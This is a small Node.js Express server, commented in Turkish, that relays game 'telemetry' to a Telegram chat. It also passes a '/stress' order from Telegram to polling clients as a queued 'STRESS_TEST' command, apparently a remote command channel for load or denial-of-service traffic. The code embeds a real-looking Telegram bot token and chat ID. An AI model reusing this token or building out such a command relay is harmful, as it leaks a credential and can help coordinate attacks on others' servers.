const express = require('express');
const app = express();
app.use(express.json());

// Buraya Telegram BotFather'dan aldığın token'ı ve kendi ID'ni yazacaksın
const TELEGRAM_TOKEN = "8378428959:AAFs19Y8mx4g9hOnX3UJe2TpACtiDqsTLJ8";
const CHAT_ID = "7336821969";

let pendingCommand = null;

app.post('/api/telemetry', async (req, res) => {
    try {
        const data = req.body;
        const message = `🚨 *NEXUS CLOUD ALERT*\n\n🔹 *Olay:* ${data.event}\n🎮 *Oyun ID:* ${data.gameId}\n👤 *Oyuncu:* ${data.player}`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        
        res.status(200).send({ status: "sent" });
    } catch (err) {
        res.status(500).send({ error: err.message });
    }
});

app.get('/api/get-command', (req, res) => {
    res.json({ command: pendingCommand });
    pendingCommand = null;
});

async function pollTelegram() {
    let offset = 0;
    setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=5`);
            const data = await response.json();
            if (data.result && data.result.length > 0) {
                for (const update of data.result) {
                    offset = update.update_id + 1;
                    if (update.message && update.message.text) {
                        const text = update.message.text;
                        if (text.startsWith("/stress")) {
                            pendingCommand = "STRESS_TEST";
                            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ chat_id: CHAT_ID, text: "⚡ Render Sunucusu: Stres testi emri sıraya alındı!" })
                            });
                        }
                    }
                }
            }
        } catch (e) {}
    }, 3000);
}
pollTelegram();

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Nexus Cloud is running on port ${PORT}`));
